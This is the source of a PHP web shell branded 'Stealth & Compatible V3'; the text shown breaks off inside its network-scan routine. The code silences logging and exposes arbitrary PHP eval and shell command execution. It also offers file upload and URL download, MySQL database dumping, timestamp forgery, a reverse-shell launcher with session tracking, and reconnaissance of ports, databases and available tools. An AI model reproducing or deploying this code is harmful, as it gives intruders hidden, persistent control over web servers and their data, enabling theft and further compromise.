<?php
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
@ini_set('error_log', NULL);
@ini_set('memory_limit', '-1');
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);
if (function_exists('apache_setenv')) {
    @apache_setenv('no-gzip', '1');
    @apache_setenv('dont-log', '1');
}


define('SHELL_VERSION', 'Web Shell - Stealth & Compatible V3');
define('REVERSE_SHELL_DEFAULT_IP', '127.0.0.1');
define('REVERSE_SHELL_DEFAULT_PORT', '4444');
define('SHELL_PASSWORD', '1234shell');
define('DATA_SEPARATOR', '/*__INTERNAL_' . 'DATA_START__*/');

// Ghost params for downloads
$g_k = 'PHPSSIDLOGINFODATARECOVESSRYSYSTEM';
$g_v = 'SYSTEM32LOGFILEINSTANCE';

function get_embedded_data() {
    $content = @file_get_contents(__FILE__);
    $parts = explode(DATA_SEPARATOR, $content);
    if (count($parts) > 1) {
        $json = base64_decode(trim($parts[1]));
        return json_decode($json, true) ?: array();
    }
    return array();
}

function save_embedded_data($key, $value) {
    $data = get_embedded_data();
    $data[$key] = $value;
    $content = @file_get_contents(__FILE__);
    $parts = explode(DATA_SEPARATOR, $content);
    $script_code = $parts[0];
    $new_data_block = base64_encode(json_encode($data));
    $new_content = $script_code . DATA_SEPARATOR . "\n" . $new_data_block;
    @file_put_contents(__FILE__, $new_content);
    return $data;
}

function get_store($key) {
    $data = get_embedded_data();
    return isset($data[$key]) ? $data[$key] : null;
}

$action = isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : '');

// Virtual Session Initialization
if (empty($_SESSION['current_dir'])) { $_SESSION['current_dir'] = realpath(getcwd() ?: '.'); }
if (empty($_SESSION['terminal_cwd'])) { $_SESSION['terminal_cwd'] = $_SESSION['current_dir']; }
if (!isset($_SESSION['reverse_shells'])) { $_SESSION['reverse_shells'] = array(); }

function is_shellexec_enabled() {
    if (!function_exists('shell_exec')) return false;
    $disabled = ini_get('disable_functions');
    if ($disabled) {
        $disabled_array = array_map('trim', explode(',', $disabled));
        return !in_array('shell_exec', $disabled_array);
    }
    return true;
}

function get_os_type() { return strtoupper(substr(PHP_OS, 0, 3)); }

function get_current_user_host() {
    $user = 'user';
    if (is_shellexec_enabled()) {
        $whoami_user = trim(@shell_exec('whoami'));
        if (!empty($whoami_user)) {
            $user = $whoami_user;
        } else {
            $user = function_exists('get_current_user') ? (@get_current_user() ?: 'user') : 'user';
        }
    } else {
        $user = function_exists('get_current_user') ? (@get_current_user() ?: 'user') : 'user';
        if ($user === 'user' && function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
            $u_info = posix_getpwuid(posix_geteuid());
            if ($u_info) $user = $u_info['name'];
        }
    }
    $hostname = function_exists('gethostname') ? (@gethostname() ?: 'host') : 'host';
    return array('user' => $user, 'hostname' => $hostname);
}

function formatBytes($bytes) {
    if (!is_numeric($bytes) || $bytes < 0) return 'N/A';
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    return round($bytes / pow(1024, min($pow, count($units) - 1)), 2) . ' ' . $units[min($pow, count($units) - 1)];
}

function getNetworkPorts() {
    if (is_shellexec_enabled() && get_os_type() !== 'WIN') {
        $output = @shell_exec('ss -tulnp 2>/dev/null');
        if (!empty($output)) {
            $open_ports = array();
            $lines = array_filter(explode("\n", $output));
            array_shift($lines);
            foreach ($lines as $line) {
                $parts = preg_split('/\s+/', trim($line));
                if (count($parts) < 5) continue;
                $protocol = $parts[0];
                $local_address_port = $parts[4];
                $process_info = $parts[count($parts) - 1];
                if (!preg_match('/[:\.](\d+)$/', $local_address_port, $port_matches)) continue;
                $port = $port_matches[1];
                $process_name = 'N/A';
                if (preg_match('/users:\(\("([^"]+)"/', $process_info, $process_matches)) {
                    $process_name = $process_matches[1];
                }
                $open_ports[$protocol . ':' . $port] = array('protocol' => $protocol, 'port' => $port, 'process' => $process_name);
            }
            if (empty($open_ports)) return array(array('status' => 'info', 'message' => '`ss -tulnp` ran but no listening ports were found.'));
            $sorted_ports = array_values($open_ports);
            usort($sorted_ports, function($a, $b) { return $a['port'] - $b['port']; });
            return $sorted_ports;
        }
    }
    $ports_to_scan = array(21, 22, 80, 443, 3306, 5432, 8080);
    $open_ports_fallback = array();
    foreach ($ports_to_scan as $port) {
        $connection = @fsockopen('127.0.0.1', $port, $errno, $errstr, 0.2);
        if (is_resource($connection)) {
            $open_ports_fallback[] = array('protocol' => 'tcp', 'port' => $port, 'process' => 'N/A');
            fclose($connection);
        }
    }
    return empty($open_ports_fallback) ? array(array('status' => 'info', 'message' => 'Fallback: No open ports found from common list via fsockopen.')) : $open_ports_fallback;
}

function getDatabaseInfo($open_ports) {
    $databases = array(
        'MySQL/MariaDB' => array('p' => 'mysqld', 'port' => 3306),
        'PostgreSQL' => array('p' => 'postgres', 'port' => 5432),
        'MongoDB' => array('p' => 'mongod', 'port' => 27017),
        'Redis' => array('p' => 'redis-server', 'port' => 6379)
    );
    $detected = array();
    if (isset($open_ports[0]['status'])) {
        return array(array('status' => 'info', 'message' => 'Cannot detect databases; no open port data available.'));
    }
    foreach ($databases as $name => $db_meta) {
        foreach ($open_ports as $port_info) {
            if (stripos($port_info['process'], $db_meta['p']) !== false || $port_info['port'] == $db_meta['port']) {
                $process_display_name = $port_info['process'];
                if ($process_display_name === 'N/A' && $port_info['port'] == $db_meta['port']) {
                    $process_display_name = $db_meta['p'] . ' (inferred from port)';
                }
                $details = array('Port' => $port_info['port'], 'Process Name' => $process_display_name);
                if (is_shellexec_enabled()) {
                    switch ($name) {
                        case 'MySQL/MariaDB':
                            $version_output = @shell_exec('mysqld --version 2>/dev/null');
                            if (preg_match('/Ver\s+([^\s,]+)/', $version_output, $matches)) { $details['Version'] = $matches[1]; }
                            $details['Default User'] = 'root';
                            $details['Connect Command'] = '`mysql -h 127.0.0.1 -u root -p`';
                            break;
                        case 'PostgreSQL':
                            $version_output = @shell_exec('postgres --version 2>/dev/null');
                            if (preg_match('/(\d+\.\d+(\.\d+)?)/', $version_output, $matches)) { $details['Version'] = $matches[1]; }
                            $details['Default User'] = 'postgres';
                            $details['Connect Command'] = '`psql -h 127.0.0.1 -U postgres`';
                            break;
                        case 'MongoDB':
                            $version_output = @shell_exec('mongod --version 2>/dev/null');
                            if (preg_match('/db version\s+v([^\s]+)/', $version_output, $matches)) { $details['Version'] = $matches[1]; }
                            $details['Pentest Note'] = 'Older versions may have no auth by default.';
                            $details['Connect Command'] = '`mongo --host 127.0.0.1`';
                            break;
                        case 'Redis':
                            $info_output = @shell_exec('redis-cli INFO server 2>/dev/null');
                            if ($info_output) {
                                $lines = explode("\r\n", $info_output);
                                foreach($lines as $line) {
                                    if (strpos($line, ':') !== false) {
                                        list($key, $val) = explode(':', $line, 2);
                                        if (in_array($key, array('redis_version', 'os', 'redis_mode', 'tcp_port'))) {
                                            $details[ucfirst(str_replace('_', ' ', $key))] = $val;
                                        }
                                    }
                                }
                            }
                            $details['Pentest Note'] = 'Often exposed without auth. Check for RCE.';
                            $details['Connect Command'] = '`redis-cli -h 127.0.0.1`';
                            break;
                    }
                }
                $detected[] = array( 'service' => $name, 'details' => $details );
                continue 2;
            }
        }
    }
    return empty($detected) ? array(array('status' => 'info', 'message' => 'No common database services detected on open ports.')) : $detected;
}

function get_public_ip() {
    $services = array('https://api.ipify.org', 'http://ifconfig.me/ip', 'http://ipecho.net/plain');
    foreach ($services as $service) {
        $ip = @file_get_contents($service);
        if ($ip !== false && filter_var(trim($ip), FILTER_VALIDATE_IP)) return trim($ip);
    }
    return 'N/A';
}

function getSystemInfo() {
    $open_ports_data = getNetworkPorts();
    $internal_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (@gethostbyname($_SERVER['SERVER_NAME']) ?: 'N/A');
    $public_ip = get_public_ip();
    $domain_name = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'N/A';
    $user_host_info = get_current_user_host();
    $available_commands = array();
    if (is_shellexec_enabled()) {
        $commands_to_check = array('curl', 'wget', 'python', 'perl', 'sudo', 'pkexec','gcc','make');
        $is_win = get_os_type() === 'WIN';
        foreach ($commands_to_check as $cmd) {
            $check_cmd = $is_win ? "where $cmd" : "command -v $cmd";
            $redirect = $is_win ? '2>nul' : '2>/dev/null';
            $output = @shell_exec($check_cmd . " $redirect");
            $available_commands[ucfirst($cmd)] = !empty(trim($output)) ? 'ON' : 'OFF';
        }
    }

    $loaded_extensions = implode(', ', get_loaded_extensions());

    $cpu_info = 'N/A';
    if (is_readable('/proc/cpuinfo')) {
        $cpu_data = @file_get_contents('/proc/cpuinfo');
        if (preg_match('/model name\s+:\s+(.*)$/m', $cpu_data, $matches)) {
            $cpu_info = $matches[1];
        }
    }

    $mem_info = 'N/A';
    if (is_readable('/proc/meminfo')) {
        $mem_data = @file_get_contents('/proc/meminfo');
        if (preg_match('/MemTotal:\s+(.*)$/m', $mem_data, $matches)) {
            $mem_info = $matches[1];
        }
    }

    $disk_info = 'N/A';
    if (function_exists('disk_free_space') && function_exists('disk_total_space')) {
        $disk_info = formatBytes(disk_free_space("/")) . " free of " . formatBytes(disk_total_space("/"));
    }

    return array(
        'Shell Version' => SHELL_VERSION,
        'OS' => php_uname(),
        'CPU Info' => $cpu_info,
        'Memory Info' => $mem_info,
        'Disk Space' => $disk_info,
        'PHP Version' => phpversion(),
        'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A',
        'User' => $user_host_info['user'],
        'Hostname' => $user_host_info['hostname'],
        'Internal IP' => $internal_ip,
        'Public IP' => $public_ip,
        'Domain Name' => $domain_name,
        'PHP SAPI' => php_sapi_name(),
        'shell_exec Status' => is_shellexec_enabled() ? 'Enabled' : 'Disabled',
        'Disabled Functions' => ini_get('disable_functions') ?: 'None',
        'Open Basedir' => ini_get('open_basedir') ?: 'None',
        'Safe Mode' => ini_get('safe_mode') ? 'ON' : 'OFF',
        'Memory Limit' => ini_get('memory_limit'),
        'Max Post Size' => ini_get('post_max_size'),
        'Max Upload Size' => ini_get('upload_max_filesize'),
        'Loaded Extensions' => $loaded_extensions,
        'Available Commands' => $available_commands,
        'Open Ports' => $open_ports_data,
        'Database Services' => getDatabaseInfo($open_ports_data)
    );
}

function permsToSymbolic($perms) {
    if (($perms & 0xC000) == 0xC000) { $info = 's'; }
    elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; }
    elseif (($perms & 0x8000) == 0x8000) { $info = '-'; }
    elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; }
    elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; }
    elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; }
    elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; }
    else { $info = 'u'; }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function getFileInfo($path) {
    clearstatcache(true, $path);
    if (!file_exists($path) && !is_link($path)) return null;
    $p = @fileperms($path);
    $octal = $p ? substr(sprintf('%o', $p), -4) : '0000';
    $symbolic = $p ? permsToSymbolic($p) : '---------';
    return array(
        'name' => basename($path),
        'is_dir' => is_dir($path),
        'type' => is_link($path) ? 'Symlink' : (is_dir($path) ? 'Directory' : 'File'),
        'size' => is_file($path) ? @filesize($path) : '-',
        'modified' => @filemtime($path) ? date("Y-m-d H:i:s", @filemtime($path)) : 'N/A',
        'permissions' => $symbolic,
        'permissions_oct' => $octal
    );
}
function getDirectoryListing($dir) {
    $files = array();
    if (!$items = @scandir($dir)) return false;
    usort($items, function($a, $b) use ($dir) {
        if ($a === '..') return -1;
        if ($b === '..') return 1;
        $is_dir_a = is_dir($dir . DIRECTORY_SEPARATOR . $a);
        $is_dir_b = is_dir($dir . DIRECTORY_SEPARATOR . $b);
        if ($is_dir_a !== $is_dir_b) return $is_dir_a ? -1 : 1;
        return strcasecmp($a, $b);
    });
    foreach ($items as $item) {
        if ($item == '.') continue;
        if ($info = getFileInfo($dir . DIRECTORY_SEPARATOR . $item)) $files[] = $info;
    }
    return $files;
}
function recursiveDeleteDirectory($dir) {
    if (!is_dir($dir)) return @unlink($dir);
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
    foreach ($iterator as $file) {
        if ($file->isDir()) @rmdir($file->getRealPath());
        else @unlink($file->getRealPath());
    }
    return @rmdir($dir);
}

function get_vault_key() {
    global $key;
    return isset($key) ? $key : (isset($_SERVER["HTTP_X_VAULT_KEY"]) ? $_SERVER["HTTP_X_VAULT_KEY"] : (isset($_COOKIE["v_key"]) ? $_COOKIE["v_key"] : null));
}
function vault_encrypt($data, $vkey) {
    if (!$vkey) return $data;
    $iv_len = openssl_cipher_iv_length("aes-256-cbc");
    $iv = openssl_random_pseudo_bytes($iv_len);
    $encrypted = openssl_encrypt($data, "aes-256-cbc", $vkey, 0, $iv);
    return "VAULT:" . base64_encode($iv . $encrypted);
}
function vault_decrypt($data, $vkey) {
    if (!$vkey || strpos($data, "VAULT:") !== 0) return $data;
    $raw = base64_decode(substr($data, 6));
    $iv_len = openssl_cipher_iv_length("aes-256-cbc");
    $iv = substr($raw, 0, $iv_len);
    $cipher = substr($raw, $iv_len);
    return openssl_decrypt($cipher, "aes-256-cbc", $vkey, 0, $iv);
}

if ($action === 'download' && isset($_GET['file'])) {
    if (isset($_SESSION['current_dir'])) {
        $file_path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . basename($_GET['file']));
        if ($file_path && is_file($file_path) && is_readable($file_path)) {
            $vkey = get_vault_key();
            $decrypted = vault_decrypt(file_get_contents($file_path), $vkey);
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . strlen($decrypted));
            ob_clean();
            flush();
            echo $decrypted;
            return;
        }
    }
}

if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
    header('Content-Type: application/json');
    $response = array('status' => 'error', 'message' => 'Invalid action');

    switch ($action) {
        case 'get_sysinfo': $response = array('status' => 'success', 'data' => getSystemInfo()); break;
        case 'get_processes':
            $output = 'shell_exec is disabled.';
            if (is_shellexec_enabled()) {
                $output = @shell_exec(get_os_type() === 'WIN' ? 'tasklist /V /FO CSV /NH' : 'ps auxww');
            }
            $response = array('status' => 'success', 'data' => $output ?: 'Command failed or no output.', 'os' => get_os_type());
            break;
        case 'kill_process':
            if (!is_shellexec_enabled()) { $response['message'] = 'shell_exec is required.'; break; }
            $pid = filter_var(isset($_POST['pid']) ? $_POST['pid'] : '', FILTER_VALIDATE_INT);
            if ($pid) {
                $is_win = get_os_type() === 'WIN';
                $command = $is_win ? "taskkill /PID {$pid} /F" : "kill -9 {$pid}"; @shell_exec($command . ' 2>&1');
                $response = array('status' => 'success', 'message' => "Kill signal sent to PID {$pid}.");
            } else { $response['message'] = 'Invalid PID provided.'; }
            break;
        case 'php_eval':
            ob_start();
            try {
                $code = isset($_POST['code']) ? $_POST['code'] : '';
                eval($code);
            } catch (Exception $e) {
                echo "Error: " . $e->getMessage();
            } catch (Throwable $t) {
                echo "Error: " . $t->getMessage();
            }
            $response = array('status' => 'success', 'data' => ob_get_clean());
            break;
        case 'execute_cmd':
            $cmd = trim(isset($_POST['cmd']) ? $_POST['cmd'] : '');
            $output = '';
            $cwd = $_SESSION['terminal_cwd'];

            if (preg_match('/^\s*cd\s+(.*)$/i', $cmd, $matches)) {
                $target_dir = trim($matches[1] ?: '~');
                if ($target_dir === '~') $target_dir = $_SESSION['current_dir'];
                $new_cwd = realpath($cwd . DIRECTORY_SEPARATOR . $target_dir);
                if ($new_cwd && is_dir($new_cwd)) {
                    $_SESSION['terminal_cwd'] = $new_cwd;
                    $response = array('status' => 'success', 'output' => '', 'cwd' => $new_cwd);
                } else {
                    $response['message'] = 'cd: No such file or directory';
                }
            } else {
                if (is_shellexec_enabled()) {
                    $full_cmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
                    $output = @shell_exec($full_cmd);
                } else {
                    // PHP Fallbacks
                    if ($cmd === 'whoami') {
                        $user_info = get_current_user_host();
                        $output = $user_info['user'] . "\n";
                    } elseif ($cmd === 'pwd') {
                        $output = $cwd . "\n";
                    } elseif (preg_match('/^ls\s?(.*)$/', $cmd, $ls_matches)) {
                        $ls_dir = trim($ls_matches[1]) ?: '.';
                        $ls_path = realpath($cwd . DIRECTORY_SEPARATOR . $ls_dir);
                        if ($ls_path && is_dir($ls_path)) {
                            $files = scandir($ls_path);
                            $output = implode("\n", $files) . "\n";
                        } else { $output = "ls: cannot access '$ls_dir': No such file or directory\n"; }
                    } elseif (preg_match('/^cat\s+(.*)$/', $cmd, $cat_matches)) {
                        $cat_file = trim($cat_matches[1]);
                        $cat_path = realpath($cwd . DIRECTORY_SEPARATOR . $cat_file);
                        if ($cat_path && is_file($cat_path)) {
                            $vkey = get_vault_key();
                            $output = vault_decrypt(file_get_contents($cat_path), $vkey) . "\n";
                        } else { $output = "cat: $cat_file: No such file or directory\n"; }
                    } elseif ($cmd === 'id') {
                        $user_info = get_current_user_host();
                        $output = "uid=" . (function_exists('posix_getuid') ? posix_getuid() : 'N/A') . "(" . $user_info['user'] . ") groups=N/A\n";
                    } elseif (preg_match('/^mkdir\s+(.*)$/', $cmd, $mk_matches)) {
                        $new_dir = trim($mk_matches[1]);
                        if (@mkdir($cwd . DIRECTORY_SEPARATOR . $new_dir)) { $output = ""; }
                        else { $output = "mkdir: cannot create directory '$new_dir': Permission denied\n"; }
                    } elseif (preg_match('/^rm\s+(.*)$/', $cmd, $rm_matches)) {
                        $target = trim($rm_matches[1]);
                        $target_path = $cwd . DIRECTORY_SEPARATOR . $target;
                        if (is_dir($target_path)) {
                            if (recursiveDeleteDirectory($target_path)) { $output = ""; }
                            else { $output = "rm: cannot remove '$target': Permission denied\n"; }
                        } else {
                            if (@unlink($target_path)) { $output = ""; }
                            else { $output = "rm: cannot remove '$target': No such file or directory\n"; }
                        }
                    } else {
                        $output = "shell_exec is disabled and no PHP fallback for: $cmd\n";
                    }
                }
                $response = array('status' => 'success', 'output' => $output, 'cwd' => $_SESSION['terminal_cwd']);
            }
            break;
        case 'list_dir':
            $post_dir = isset($_POST['dir']) ? $_POST['dir'] : $_SESSION['current_dir'];
            $dir = realpath($post_dir);
            if ($dir && is_dir($dir) && is_readable($dir)) {
                $_SESSION['current_dir'] = $dir;
                $response = array('status' => 'success', 'path' => $dir, 'listing' => getDirectoryListing($dir));
            } else { $response['message'] = 'Directory not found or not readable.'; }
            break;
        case 'get_file_content':
            $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']);
            if ($path && is_file($path) && is_readable($path)) {
                $vkey = get_vault_key();
                $response = array('status' => 'success', 'path' => $path, 'content' => vault_decrypt(file_get_contents($path), $vkey));
            } else { $response['message'] = 'File not found or not readable.'; }
            break;
        case 'save_file':
            $vkey = get_vault_key();
            $content = isset($_POST['content']) ? $_POST['content'] : '';
            if (file_put_contents($_POST['path'], vault_encrypt($content, $vkey)) !== false) {
                $response = array('status' => 'success', 'message' => basename($_POST['path']) . ' saved.');
            } else { $response['message'] = 'Failed to save file.'; }
            break;
        case 'delete_item':
            $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']);
            if ($path && (is_dir($path) ? recursiveDeleteDirectory($path) : @unlink($path))) {
                $response = array('status' => 'success', 'message' => basename($path) . ' deleted.');
            } else { $response['message'] = 'Failed to delete ' . basename($path) . '.'; }
            break;
        case 'create_item':
            $name = trim(isset($_POST['name']) ? $_POST['name'] : '');
            if ($name && strpbrk($name, "\\/?%*:|\"<>") === false) {
                $new_path = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $name;
                $type = $_POST['type'];
                if (file_exists($new_path)) { $response['message'] = 'Item already exists.'; }
                elseif (($type === 'dir' && @mkdir($new_path)) || ($type === 'file' && @touch($new_path))) {
                    $response = array('status' => 'success', 'message' => ucfirst($type) . ' created.');
                } else { $response['message'] = 'Creation failed.'; }
            } else { $response['message'] = 'Invalid name.'; }
            break;
        case 'rename_item':
            $old_path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']);
            $new_name = trim(isset($_POST['new_name']) ? $_POST['new_name'] : '');
            if ($old_path && !empty($new_name) && strpbrk($new_name, "\\/?%*:|\"<>") === false) {
                $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $new_name;
                if (file_exists($new_path)) { $response['message'] = 'Destination name already exists.'; }
                elseif (@rename($old_path, $new_path)) {
                    $response = array('status' => 'success', 'message' => basename($old_path) . ' renamed to ' . $new_name);
                } else { $response['message'] = 'Rename failed. Check permissions.'; }
            } else { $response['message'] = 'Invalid old path or new name provided.'; }
            break;
        case 'change_permissions':
            $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']);
            $perms = isset($_POST['permissions']) ? $_POST['permissions'] : '';
            if ($path && preg_match('/^[0-7]{3,4}$/', $perms)) {
                if (@chmod($path, octdec($perms))) {
                    $response = array('status' => 'success', 'message' => 'Permissions for ' . basename($path) . ' set to ' . $perms);
                } else { $response['message'] = 'Failed to set permissions.'; }
            } else { $response['message'] = 'Invalid path or permission format.'; }
            break;
        case 'change_date':
            $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']);
            $date_str = isset($_POST['new_date']) ? $_POST['new_date'] : 'now';
            $timestamp = ($date_str === 'now') ? time() : strtotime($date_str);
            if ($path && $timestamp !== false) {
                if (@touch($path, $timestamp)) {
                    $response = array('status' => 'success', 'message' => 'Timestamp for ' . basename($path) . ' updated.');
                } else { $response['message'] = 'Failed to update timestamp.'; }
            } else { $response['message'] = 'Invalid path or date format.'; }
            break;
        case 'upload_files':
            $count = 0;
            $vkey = get_vault_key();
            if (isset($_FILES['upload_files'])) {
                foreach ($_FILES['upload_files']['tmp_name'] as $i => $tmp_name) {
                    if ($_FILES['upload_files']['error'][$i] == UPLOAD_ERR_OK) {
                        $file_content = file_get_contents($tmp_name);
                        $encrypted = vault_encrypt($file_content, $vkey);
                        if (file_put_contents($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . basename($_FILES['upload_files']['name'][$i]), $encrypted)) $count++;
                    }
                }
            }
            $response = array('status' => 'success', 'message' => "$count file(s) uploaded.");
            break;
        case 'upload_from_url':
            $url = isset($_POST['url']) ? $_POST['url'] : '';
            $filename = basename(parse_url($url, PHP_URL_PATH) ?: 'downloaded_file');
            $target_path = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $filename;
            $file_content = @file_get_contents($url);
            if ($file_content === false && function_exists('curl_init')) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $file_content = curl_exec($ch);
                curl_close($ch);
            }
            if ($file_content !== false) {
                $vkey = get_vault_key();
                if (@file_put_contents($target_path, vault_encrypt($file_content, $vkey)) !== false) {
                    $response = array('status' => 'success', 'message' => "File downloaded and saved as $filename");
                } else { $response['message'] = "Failed to save downloaded file."; }
            } else { $response['message'] = "Failed to download file from URL."; }
            break;
        case 'db_list_dbs':
            $db_host = $_POST['host'] ?: '127.0.0.1'; $db_user = $_POST['user'] ?: 'root'; $db_pass = $_POST['pass'] ?: '';
            $conn = @new mysqli($db_host, $db_user, $db_pass);
            if ($conn->connect_error) { $response['message'] = "Connection failed: " . $conn->connect_error; }
            else {
                $res = $conn->query("SHOW DATABASES");
                $dbs = array();
                while ($row = $res->fetch_row()) { $dbs[] = $row[0]; }
                $response = array('status' => 'success', 'databases' => $dbs);
                $conn->close();
            }
            break;
        case 'db_dump':
            $db_host = $_POST['host'] ?: '127.0.0.1'; $db_user = $_POST['user'] ?: 'root'; $db_pass = $_POST['pass'] ?: ''; $db_name = $_POST['db'];
            if (!$db_name) { $response['message'] = "No database selected."; break; }
            $output = '';
            if (is_shellexec_enabled()) {
                $output = @shell_exec("mysqldump -h " . escapeshellarg($db_host) . " -u " . escapeshellarg($db_user) . " -p" . escapeshellarg($db_pass) . " " . escapeshellarg($db_name) . " 2>&1");
            }
            if (empty($output) || strpos($output, 'mysqldump: [Warning]') === 0 || strpos($output, 'Usage:') === 0) {
                // Fallback to PHP-based dump (very basic)
                $conn = @new mysqli($db_host, $db_user, $db_pass, $db_name);
                if (!$conn->connect_error) {
                    $output = "-- Database Dump\n-- Host: $db_host\n-- DB: $db_name\n\n";
                    $tables = array();
                    $result = $conn->query("SHOW TABLES");
                    while ($row = $result->fetch_row()) { $tables[] = $row[0]; }
                    foreach ($tables as $table) {
                        $result = $conn->query("SELECT * FROM " . $table);
                        $num_fields = $result->field_count;
                        $output .= "DROP TABLE IF EXISTS `$table`;\n";
                        $row2 = $conn->query("SHOW CREATE TABLE `$table`")->fetch_row();
                        $output .= $row2[1] . ";\n\n";
                        while ($row = $result->fetch_row()) {
                            $output .= "INSERT INTO `$table` VALUES(";
                            for ($j=0; $j<$num_fields; $j++) {
                                $row[$j] = $conn->real_escape_string($row[$j]);
                                if (isset($row[$j])) { $output .= '"' . $row[$j] . '"'; } else { $output .= 'NULL'; }
                                if ($j < ($num_fields-1)) { $output .= ','; }
                            }
                            $output .= ");\n";
                        }
                        $output .= "\n\n";
                    }
                    $conn->close();
                } else { $response['message'] = "PHP Dump Failed: " . $conn->connect_error; break; }
            }
            $response = array('status' => 'success', 'dump' => $output, 'filename' => $db_name . '_' . date('Y-m-d') . '.sql');
            break;
        case 'execute_revshell_cmd':
            if (!is_shellexec_enabled()) { $response['message'] = 'shell_exec is required.'; break; }
            $command = isset($_POST['command']) ? $_POST['command'] : '';
            $rhost = isset($_POST['rhost']) ? $_POST['rhost'] : 'N/A';
            $rport = isset($_POST['rport']) ? $_POST['rport'] : 'N/A';
            if (!empty($command)) {
                $bg_cmd = 'nohup ' . $command . ' > /dev/null 2>&1 & echo $!';
                $pid = get_os_type() === 'WIN' ? 'N/A' : trim(@shell_exec($bg_cmd));
                $_SESSION['reverse_shells'][uniqid()] = array('pid' => $pid, 'host' => $rhost, 'port' => $rport, 'time' => date('Y-m-d H:i:s'));
                $response = array('status' => 'success', 'message' => 'Reverse shell command executed.', 'sessions' => $_SESSION['reverse_shells']);
            } else { $response['message'] = 'Empty command.'; }
            break;
        case 'get_revshell_sessions': $response = array('status' => 'success', 'sessions' => $_SESSION['reverse_shells']); break;
        case 'check_revshell_status':
            $statuses = array();
            $is_win = get_os_type() === 'WIN';
            foreach ($_SESSION['reverse_shells'] as $id => $session) {
                $pid = $session['pid'];
                $is_running = false;
                if (is_numeric($pid) && $pid > 0 && is_shellexec_enabled()) {
                    if ($is_win) {
                        $output = @shell_exec("tasklist /FI \"PID eq {$pid}\"");
                        if (strpos($output, (string)$pid) !== false) $is_running = true;
                    } else {
                        $output = @shell_exec("ps -p {$pid}");
                        if (count(explode("\n", trim($output))) > 1) $is_running = true;
                    }
                }
                $statuses[$id] = $is_running ? 'Online' : 'Offline';
            }
            $response = array('status' => 'success', 'statuses' => $statuses);
            break;
        case 'kill_revshell':
            $id = $_POST['id'];
            $pid = $_SESSION['reverse_shells'][$id]['pid'];
            if ($pid && $pid !== 'N/A') @shell_exec("kill -9 {$pid}");
            unset($_SESSION['reverse_shells'][$id]);
            $response = array('status' => 'success', 'message' => 'Session terminated.', 'sessions' => $_SESSION['reverse_shells']);
            break;
        case 'start_scan':
            if (!is_shellexec_enabled()) { $response['message'] = 'shell_exec is required.'; break; }
            $scan_id = 'scan_' . uniqid();
            $result_file = sys_get_temp_dir() . "/$scan_id.log";
            $pid_file = sys_get_temp_dir() . "/$scan_id.pid";
            $script_file = sys_get_temp_dir() . "/$scan_id.php";
            $scan_type = $_POST['scan_type'];
            $php_script = '<?php set_time_limit(0); ignore_user_abort(true); ini_set("display_errors",0); $file = "'.$result_file.'"; $pid_file = "'.$pid_file.'"; file_put_contents($pid_file, getmypid());';
            if ($scan_type === 'network') {
                $range_str = $_POST['range'];
                $ips = array();
                if (strpos($range_str, '/') !== false) { list($subnet, $mask) = explode('/', $range_str); $subnet = ip2long($subnet); $mask = 32 - $mask; $total = 1 << $mask; for ($i = 1; $i < $total -1; $i++) { $ips[] = long2ip($subnet + $i); } } elseif (strpos($range_str, '-') !== false) { list($start, $end) = explode('-', $range_str); $start_ip_base = substr($start, 0, strrpos($start, '.')); $start_host = substr($start, strrpos($start, '.') + 1); for ($i = $start_host; $i <= $end; $i++) { $ips[] = "$start_ip_base.$i"; } } else { $ips[] = $range_str; }
                $php_script .= '$ips = '.var_export($ips, true).'; $total = count($ips); $os = "'.get_os_type().'";';
